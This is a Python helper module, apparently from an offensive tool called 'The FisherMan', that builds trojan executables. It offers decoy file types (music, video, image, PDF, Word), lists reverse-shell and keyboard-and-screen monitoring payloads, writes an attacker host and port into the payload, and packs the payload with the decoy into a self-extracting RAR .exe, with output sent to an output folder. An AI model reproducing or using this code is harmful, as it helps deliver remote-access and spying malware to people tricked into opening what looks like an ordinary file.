from os import remove, system, path, mkdir
from colorama import *
from termcolor import *
from pyfiglet import *


def banner():
	custom_fig = Figlet(font='big')
	print(custom_fig.renderText('\t\tThe FisherMan '))
	custom_fig = Figlet(font='future')
	print(custom_fig.renderText("Let's go fishing"))

def line():
	cprint("==============================================================================\n", 'white' ,attrs=['bold'], file=sys.stderr)

def print_wait():
	cprint("[[!]] Creating your file, please Wait !!", 'red' ,attrs=['bold'], file=sys.stderr)

def Liste_of_options():
	cprint("1 - MP3 music (.mp3)", 'yellow' ,attrs=['bold'], file=sys.stderr)
	cprint("2 - video (.mp4)", 'magenta' ,attrs=['bold'], file=sys.stderr)
	cprint("3 - image (.png)", 'green' ,attrs=['bold'], file=sys.stderr)
	cprint("4 - pdf document (.pdf)", 'red' ,attrs=['bold'], file=sys.stderr)
	cprint("5 - MS word document (.docx)", 'blue', 'on_white', attrs=['bold'], file=sys.stderr)

def Liste_of_payloads():
	cprint("1 - windows/meterpreter/reverse_tcp", 'red','on_yellow',attrs=['bold'], file=sys.stderr);print("\n")
	cprint("2 - python/x64/reverse_tcp", 'red','on_yellow',attrs=['bold'], file=sys.stderr);print("\n")
	cprint("3 - python/x64/monitor( keyboard&screen)", 'red','on_yellow',attrs=['bold'], file=sys.stderr);print("\n")

def set_extension(argument):
	switcher = {
		1: "mp3",
		2: "mp4",
		3: "png",
		4: "pdf",
		5: "docx",
		}
	return switcher.get(argument, "Invalid file choice")

def set_file(argument):
	switcher = {
		1: "music.mp3",
		2: "video.mp4",
		3: "photo.png",
		4: "pdf.pdf",
		5: "word.docx",
		}
	return switcher.get(argument, "Invalid file choice")

def generate(name, ex) :
	system(("rar a -sfxwin{ex}.SFX {name}.exe {name}.{ex} win6cfg.exe").format(name=name,ex=ex))
	Bfiles_exist = path.isdir("./output")
	if Bfiles_exist == False:
		mkdir("output")
	system(("mv {name}.exe output/").format(name=name))

def replace_line(file_name, line_num, text):
    lines = open(file_name, 'r').readlines()
    lines[line_num] = text
    out = open(file_name, 'w')
    out.writelines(lines)
    out.close()

def exe_prepare(file, HOST, PORT):
	text1 ="HOST=" +"'"+ HOST+"'" + "\n"
	text2 ="PORT=" + str(PORT) + "\n"
	replace_line(file, 1, text1)
	replace_line(file, 2, text2)

def init_prepare(name, ex, root_file, line):
	system(("mv firstinit.txt {name}init.txt && cp {name}init.txt firstinit.txt ").format(name=name))
	system(("mv {root_f} {name}.{ex}").format(root_f=root_file, name=name, ex=ex))
	nameinit = name +"init.txt"
	text = "Setup="+name + "."+ex + "\n"
	replace_line(nameinit,line, text)
